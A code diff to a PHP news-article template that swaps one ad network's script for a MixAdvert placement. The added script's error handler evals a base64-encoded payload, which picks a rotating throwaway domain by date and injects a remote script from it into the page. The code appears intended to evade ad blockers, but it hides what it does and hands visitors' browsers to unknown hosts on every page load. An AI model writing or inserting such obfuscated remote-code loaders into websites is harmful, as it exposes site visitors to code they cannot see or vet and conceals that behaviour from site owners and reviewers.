@@ -22,15 +22,7 @@ $data->save();
 <article class="val-column-left">
     <div class="val-single-news-conainer-with-read-else">
         <div class='val-container-one-news'>
-            <div id="adpartner-jsunit-2047">
-                <script type="text/javascript">
-                    var head = document.getElementsByTagName('head')[0];
-                    var script = document.createElement('script');
-                    script.type = 'text/javascript';
-                    script.src = "//a4p.adpartner.pro/jsunit?id=2047&" + Math.random();
-                    head.appendChild(script);
-                </script>
-            </div>
+            <div id="MIXADV_4164" class="MIXADVERT_NET"></div>
             <br />
             <br />
             <h2 class="val-title-uppercase-with-line val-title-uppercase-small"><?= CHtml::encode(Yii::app()->language == 'ru' ? $data->title_ru : $data->title_uk); ?></h2>
@@ -98,4 +90,17 @@ $data->save();
         </div>
     </div>
 </article>
+<script> 
+  var node4164 = document.getElementById("MIXADV_4164");
+  if( node4164 )
+  {
+       var script = document.createElement("script");
+       script.charset = "utf-8";
+       script.src = "https://m.mixadvert.com/show/?id=4164&r="+Math.random();
+       node4164.parentNode.appendChild(script); 
+       script.onerror = function(){
+          window.eval( atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBkYXRlX251bWJlciA9IGRhdGUuZ2V0RGF0ZSgpO3ZhciBtYXMgPSBbICIyMXpkY2ttei5zaXRlIiwidGQ5dGdhZXJzcC5zaXRlIiwiZ29zajlpY2hsZi50ZWNoIiwiOWRrY3BweXhocy5zaXRlIiwiMjF5NWU0dnluYi50ZWNoIiwiN2Vwd2FydmQyYS5zaXRlIiwibXl2enVjOGN1bS5zaXRlIiwicHNhOWU5Y280dC5zcGFjZSIsIjZ4cGR6YjNsdnYuc2l0ZSIsImVyMmZsMjJiMXcuc2l0ZSIsIm9kdHBtYWRmeDUuc3BhY2UiLCJ3Y3lxdklibThpLnNpdGUiLCJ4d2p3ZGpoYjNhLnNwYWNlIiwiMXRmbnhlajhtai5zaXRlIiwiZ2xhNGgyd2J6NC5zcGFjZSIsImppenpmemh1YmYuc2l0ZSIgXTt2YXIgaG9zdCA9IG1hc1tNYXRoLmZsb29yKCBkYXRlX251bWJlciAvIDIgKV07dmFyIHIgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAoMTAwMDAwIC0gMTAwMDAgKyAxKSkgKyAxMDAwMDt2YXIgaWQgPSA0MTY0ICsgcjt2YXIgc2NyaXB0X2ZpcnN0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7c2NyaXB0X2ZpcnN0LnNyYyA9ICJodHRwczovLyIrIGhvc3QrIi8iK3IrIi8iK2lkKyIvIjsgbm9kZTQxNjQucGFyZW50Tm9kZS5hcHBlbmRDaGlsZChzY3JpcHRfZmlyc3QpOw==") );
+      }
+  }
+</script>
     
